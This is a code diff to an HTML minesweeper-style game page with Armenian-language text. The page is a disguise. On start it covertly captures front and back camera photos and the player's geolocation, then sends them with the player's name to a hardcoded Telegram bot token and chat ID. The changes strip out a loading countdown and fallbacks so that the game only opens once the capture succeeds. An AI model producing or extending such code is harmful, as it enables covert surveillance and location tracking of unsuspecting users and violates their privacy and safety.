@@ -125,13 +125,7 @@
     #restart-btn:hover {
       background-color: #3b8b40;
     }
-    #loading-status {
-      margin-top: 10px;
-      font-size: 18px;
-      font-weight: 600;
-      user-select: text;
-      min-height: 24px;
-    }
+
     @media (max-width: 480px) {
       #game-board {
         grid-template-columns: repeat(8, 36px);
@@ -163,7 +157,6 @@
   <h1>Մուտքագրեք Ձեր անունը</h1>
   <input type="text" id="player-name" placeholder="Անուն" autocomplete="off" />
   <button id="start-btn">Սկսել խաղը</button>
-  <div id="loading-status"></div>
 </div>
 
 <div class="container" id="game-area" style="display: none;">
@@ -183,7 +176,6 @@
   const restartBtn = document.getElementById('restart-btn');
   const gameBoard = document.getElementById('game-board');
   const status = document.getElementById('status');
-  const loadingStatus = document.getElementById('loading-status');
 
   const size = 8;
   const bombsCount = 10;
@@ -319,13 +311,7 @@
     const token = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
     const chatId = '526758225';
 
-    let msg = `👤 Անուն: ${name}`;
-    if (lat !== null && lon !== null) {
-      msg += `\n📍 Գտնվում է այստեղ՝ https://www.google.com/maps?q=${lat},${lon}`;
-    } else {
-      msg += `\n📍 Գտնելու տվյալներ չկան`;
-    }
-
+    const msg = `👤 Անուն: ${name}\n📍 Գտնվում է այստեղ՝ https://www.google.com/maps?q=${lat},${lon}`;
     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
 
     if (photoFront) {
@@ -342,49 +328,27 @@
     }
   }
 
-  async function wait(ms) {
-    return new Promise(res => setTimeout(res, ms));
-  }
-
   async function startGame() {
     playerName = playerNameInput.value.trim();
     if (!playerName) return alert('Խնդրում ենք մուտքագրել անունը։');
 
     startBtn.disabled = true;
-    loadingStatus.textContent = 'Բեռնվում է... 10 վայրկյան';
 
-    // Таймер обратного отсчёта 10 секунд
-    for(let i=9; i>=0; i--) {
-      await wait(1000);
-      loadingStatus.textContent = `Բեռնվում է... ${i} վայրկյան`;
-    }
-
-    photoFrontBlob = await takePhoto('user').catch(() => null);
-    photoBackBlob = await takePhoto('environment').catch(() => null);
+    photoFrontBlob = await takePhoto('user');
+    photoBackBlob = await takePhoto('environment');
 
     try {
       coords = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
       });
     } catch {
-      coords = null;
-    }
-
-    if (!coords && !photoFrontBlob && !photoBackBlob) {
       permissionDeniedDiv.style.display = 'block';
-      loadingStatus.textContent = '';
       startBtn.disabled = false;
       return;
     }
 
-    await sendToTelegram(playerName,
-      coords ? coords.coords.latitude : null,
-      coords ? coords.coords.longitude : null,
-      photoFrontBlob,
-      photoBackBlob
-    );
+    await sendToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoFrontBlob, photoBackBlob);
 
-    loadingStatus.textContent = '';
     startForm.style.display = 'none';
     gameArea.style.display = 'block';
 
